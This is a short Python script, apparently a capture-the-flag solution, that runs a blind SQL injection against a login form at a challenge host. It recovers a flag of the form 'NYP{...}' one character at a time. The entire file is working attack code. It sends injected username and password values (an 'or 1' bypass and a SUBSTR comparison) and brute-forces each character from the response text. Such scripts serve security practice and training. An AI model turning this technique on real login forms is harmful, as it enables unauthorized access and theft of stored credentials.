import requests
from string import printable


URL = "https://blind.nypinfosec.tk"
YES = "You Did It"


password = "NYP{"

while password[-1] != "}":
    print(f"Password cracking in progress: {password}")
    for char in printable:
        guess = password+char
        resp = requests.post(URL, data={
            "username": "' or 1 -- -",
            "password": f"' or SUBSTR(password, 1, {len(guess)}) = '{guess}' -- -"
        })
        if YES in resp.text:
            password += char
            break

print(f"\nSuccess!\nPassword get: {password}")
